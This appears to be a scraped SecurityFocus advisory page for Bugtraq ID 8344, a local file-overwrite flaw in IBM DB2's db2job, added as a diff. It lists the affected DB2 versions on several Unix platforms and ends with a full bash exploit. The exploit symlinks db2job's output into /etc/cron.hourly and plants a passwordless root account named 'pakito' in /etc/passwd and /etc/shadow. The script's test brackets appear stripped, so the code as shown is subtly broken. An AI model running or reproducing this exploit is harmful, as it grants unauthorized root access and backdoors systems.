@@ -1,0 +1,176 @@
+#SpeeDr00t@Black Falcon<br>#bid8344<p><b><span style="font-size: 18pt;">IBM DB2 db2job File Overwrite Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/8344/info">info</a><br><a href="http://www.securityfocus.com/bid/8344/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/8344/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/8344/solution">solution</a><br><a href="http://www.securityfocus.com/bid/8344/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				8344
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Access Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 05 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Aug 05 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Announced by Juan Manuel Pascual Escriba &lt;pask@cmlc.upv.es&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					IBM DB2 Universal Database for Solaris 7.2 <br/>
+					
+				
+					IBM DB2 Universal Database for Solaris 7.1 <br/>
+					
+				
+					IBM DB2 Universal Database for Solaris 7.0 <br/>
+					
+				
+					IBM DB2 Universal Database for Solaris 6.1 <br/>
+					
+				
+					IBM DB2 Universal Database for Solaris 6.0 <br/>
+					
+				
+					IBM DB2 Universal Database for Linux 7.2 <br/>
+					
+				
+					IBM DB2 Universal Database for Linux 7.1 <br/>
+					
+				
+					IBM DB2 Universal Database for Linux 7.0 <br/>
+					
+				
+					IBM DB2 Universal Database for Linux 6.1 <br/>
+<span class="related">
+						
+							-
+						
+						Caldera OpenLinux 2.4 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 7.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						S.u.S.E. Linux 7.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Turbolinux Turbolinux 6.0.4 <br/>
+</span>
+					
+				
+					IBM DB2 Universal Database for Linux 6.0 <br/>
+					
+				
+					IBM DB2 Universal Database for HP-UX 7.2 <br/>
+					
+				
+					IBM DB2 Universal Database for HP-UX 7.1 <br/>
+					
+				
+					IBM DB2 Universal Database for HP-UX 7.0 <br/>
+					
+				
+					IBM DB2 Universal Database for HP-UX 6.1 <br/>
+					
+				
+					IBM DB2 Universal Database for HP-UX 6.0 <br/>
+					
+				
+					IBM DB2 Universal Database for AIX 7.2 <br/>
+					
+				
+					IBM DB2 Universal Database for AIX 7.1 <br/>
+					
+				
+					IBM DB2 Universal Database for AIX 7.0 <br/>
+					
+				
+					IBM DB2 Universal Database for AIX 6.1 <br/>
+					
+				
+					IBM DB2 Universal Database for AIX 6.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	EXPLOIT<br/><br/>#!/bin/bash<br/><br/>DB2JOB=/home/db2as/sqllib/adm/db2job<br/>CRONFILE=/etc/cron.hourly/pakito<br/>USER=pakito<br/><br/>unset DB2INSTANCE<br/>export DB2DIR=./trash<br/><br/>        if  -d $DB2DIR ; then<br/>                echo Trash directory already created<br/>        else<br/>                mkdir $DB2DIR<br/>        fi<br/><br/>cd $DB2DIR<br/>        if  -f ./0_1.out ; then<br/>                echo Link Already Created<br/>        else<br/>                ln -s $CRONFILE ./0_1.out<br/>        fi<br/><br/>$DB2JOB<br/><br/><br/>echo "echo "#!/bin/bash"" &gt; $CRONFILE<br/>echo "echo "$USER:x:0:0::/:/bin/bash" &gt;&gt; /etc/passwd" &gt;&gt; $CRONFILE<br/>echo "echo "$USER::12032:0:99999:7:::" &gt;&gt; /etc/shadow" &gt;&gt; $CRONFILE<br/>echo "  must wait until cron execute $CRONFILE and then exec su pakito"
+	
+		<ul>
+</ul>
+</div>
